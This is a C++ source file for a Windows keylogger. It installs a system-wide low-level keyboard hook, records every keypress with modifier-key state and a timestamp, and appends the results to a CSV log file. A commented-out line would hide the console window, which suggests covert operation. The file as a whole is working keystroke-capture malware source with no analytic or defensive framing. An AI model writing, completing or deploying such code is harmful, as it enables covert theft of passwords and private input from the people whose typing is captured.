#include "keylogger.h"

using namespace std;

KeyLogger* KeyLogger::instance = NULL;

KeyLogger::KeyLogger(std::string logFilePath) {

    //ShowWindow(GetConsoleWindow(), SW_HIDE);

    HINSTANCE instance = GetModuleHandle(NULL);
    if(!instance) {
        exit(1);
    }

    hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);

    lshiftDown = false;
    rshiftDown = false;
    altDown = false;
    ctrlDown = false;

    ifstream logCheck(logFilePath.c_str(), ios::in);
    logFile.open(logFilePath.c_str(), ios::app);

    if(!logCheck.good()) {
        logFile << "Time, Key, LShift, RShift, Alt, Ctrl" << endl;
    }

    logCheck.close();
}

KeyLogger::~KeyLogger() {
    logFile.close();
    UnhookWindowsHookEx(hook);
}

KeyLogger* KeyLogger::getInstance() {

    if(instance == NULL) {
        instance = new KeyLogger();
    }

    return instance;
}

void KeyLogger::releaseInstance() {

    if(instance != NULL) {
        delete instance;
        instance = NULL;
    }
}

LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {

    if (nCode >= 0) {

        if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

            KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);

            switch(hooked.scanCode) {

                case SC_LSHIFT:
                    KeyLogger::getInstance()->setLShiftDown(true);
                    break;
                case SC_RSHIFT:
                    KeyLogger::getInstance()->setRShiftDown(true);
                    break;
                case SC_ALT:
                    KeyLogger::getInstance()->setAltDown(true);
                    break;
                case SC_CTRL:
                    KeyLogger::getInstance()->setCtrlDown(true);
                    break;
                default:
                    DWORD key = 1;
                    key += hooked.scanCode << 16;
                    key += hooked.flags << 24;
                    KeyLogger::getInstance()->log(key);
            }
        }

        if(wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {

            KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);

            switch(hooked.scanCode) {

                case SC_LSHIFT:;
                    KeyLogger::getInstance()->setLShiftDown(false);
                    break;
                case SC_RSHIFT:
                    KeyLogger::getInstance()->setRShiftDown(false);
                    break;
                case SC_ALT:
                    KeyLogger::getInstance()->setAltDown(false);
                    break;
                case SC_CTRL:
                    KeyLogger::getInstance()->setCtrlDown(false);
                    break;
                default:
                    break;
            }
        }
    }

    return CallNextHookEx(KeyLogger::getInstance()->getHook(), nCode, wParam, lParam);
}

void KeyLogger::listen() {
    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    logFile << "ll";
}

void KeyLogger::log(DWORD key) {
    char message[100];
    GetKeyNameText(key, message, 100);
    logFile << time(NULL) << ", " << message << ", " << lshiftDown << ", " << rshiftDown << ", " << altDown << ", " << ctrlDown << endl;
}

HHOOK KeyLogger::getHook() {
    return hook;
}

bool KeyLogger::isAltDown() { return altDown; }

void KeyLogger::setAltDown(bool down) { altDown = down; }

bool KeyLogger::isCtrlDown() { return ctrlDown; }

void KeyLogger::setCtrlDown(bool down) { ctrlDown = down; }

bool KeyLogger::isLShiftDown() { return lshiftDown; }

void KeyLogger::setLShiftDown(bool down) { lshiftDown = down; }

bool KeyLogger::isRShiftDown() { return rshiftDown; }

void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }
